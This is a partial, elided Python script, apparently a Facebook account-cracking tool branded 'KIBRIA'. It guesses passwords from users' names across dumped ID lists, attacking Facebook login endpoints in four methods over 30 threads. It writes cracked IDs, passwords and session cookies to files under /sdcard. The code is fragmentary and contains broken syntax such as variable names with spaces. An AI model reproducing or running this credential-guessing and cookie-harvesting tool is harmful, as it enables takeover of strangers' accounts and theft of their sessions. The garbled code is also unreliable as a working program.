...
from concurrent.futures import ThreadPoolExecutor as sarfrazKIBRIA 
from string import * 
...
sys.stdout.write('\x1b]2; KIBRIA \x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo ="""            \033[1;37m                                                                                                                     
KKKKKKKKK    KKKKKKKIIIIIIIIIIBBBBBBBBBBBBBBBBB   RRRRRRRRRRRRRRRRR   IIIIIIIIII               AAA                    
K:::::::K    K:::::KI::::::::IB::::::::::::::::B  R::::::::::::::::R  I::::::::I              A:::A                   
K:::::::K    K:::::KI::::::::IB::::::BBBBBB:::::B R::::::RRRRRR:::::R I::::::::I             A:::::A                  
K:::::::K   K::::::KII::::::IIBB:::::B     B:::::BRR:::::R     R:::::RII::::::II            A:::::::A                 
KK::::::K  K:::::KKK  I::::I    B::::B     B:::::B  R::::R     R:::::R  I::::I             A:::::::::A                
  K:::::K K:::::K     I::::I    B::::B     B:::::B  R::::R     R:::::R  I::::I            A:::::A:::::A               
  K::::::K:::::K      I::::I    B::::BBBBBB:::::B   R::::RRRRRR:::::R   I::::I           A:::::A A:::::A              
  K:::::::::::K       I::::I    B:::::::::::::BB    R:::::::::::::RR    I::::I          A:::::A   A:::::A             
  K:::::::::::K       I::::I    B::::BBBBBB:::::B   R::::RRRRRR:::::R   I::::I         A:::::A     A:::::A            
  K::::::K:::::K      I::::I    B::::B     B:::::B  R::::R     R:::::R  I::::I        A:::::AAAAAAAAA:::::A           
  K:::::K K:::::K     I::::I    B::::B     B:::::B  R::::R     R:::::R  I::::I       A:::::::::::::::::::::A          
KK::::::K  K:::::KKK  I::::I    B::::B     B:::::B  R::::R     R:::::R  I::::I      A:::::AAAAAAAAAAAAA:::::A         
K:::::::K   K::::::KII::::::IIBB:::::BBBBBB::::::BRR:::::R     R:::::RII::::::II   A:::::A             A:::::A        
K:::::::K    K:::::KI::::::::IB:::::::::::::::::B R::::::R     R:::::RI::::::::I  A:::::A               A:::::A       
K:::::::K    K:::::KI::::::::IB::::::::::::::::B  R::::::R     R:::::RI::::::::I A:::::A                 A:::::A      
KKKKKKKKK    KKKKKKKIIIIIIIIIIBBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRRIIIIIIIIIIAAAAAAA                   AAAAAAA     
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            KIBRIYA CHOWDHURY 
\033[1;37m Facebook:            MD GOLAM KIBRIA
\033[1;37m Github  :            K14T-TT
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back KIBRIA Menu ")
        exit()
...
def sarfraz():   
    ...
    print(f'[W] Join MESSENGER Group ')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KIBRIA] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);KIBRIA b = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={KIBRIA b};{ckkk}"
                    print(f"\r{R} [KIBRIA -OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KIBRIA _OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KIBRIA _iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [KIBRIA -CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/KIBRIA _CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KIBRIA ] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [KIBRIA -OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KIBRIA _OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/KIBRIA _iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [KIBRIA -CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[KIBRIA ] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[KIBRIA ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [KIBRIA -OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/KIBRIA _OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazKIBRIA (max_workers=30) as KIBRIA world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                KIBRIA world.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                KIBRIA world.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                KIBRIA world.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                KIBRIA world.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/KIBRIA .txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/KIBRIA .txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    KIBRIA  = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+KIBRIA +' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + KIBRIA  )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back KIBRIA  Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/KIBRIA .txt\n') 
        filepath = input("Put File Name: ")
